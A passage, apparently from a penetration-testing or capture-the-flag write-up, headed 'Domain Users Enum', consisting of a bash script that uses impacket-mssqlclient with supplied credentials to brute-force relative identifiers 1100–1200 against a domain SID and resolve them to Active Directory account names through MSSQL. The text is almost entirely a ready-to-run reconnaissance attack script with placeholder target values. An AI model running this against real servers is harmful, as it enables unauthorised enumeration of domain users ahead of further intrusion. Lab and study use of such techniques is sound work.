4. Domain Users Enum

#!/bin/bash

USERNAME="<USER>"
PASSWORD="<PASSWORD>"
SERVER="<TARGET>"
SID_BASE="<SID_BASE>"

query_sid() {
    local sid="$1"
    local full_sid="${SID_BASE}-${sid}"
    local sql="SELECT SUSER_SNAME(SID_BINARY(N'$full_sid'))"

    echo "$sql" | impacket-mssqlclient "$USERNAME:$PASSWORD@$SERVER" -file /dev/stdin 2>/dev/null | grep -a REDELEGATE
}

for sid in {1100..1200}; do
    query_sid "$sid"
done
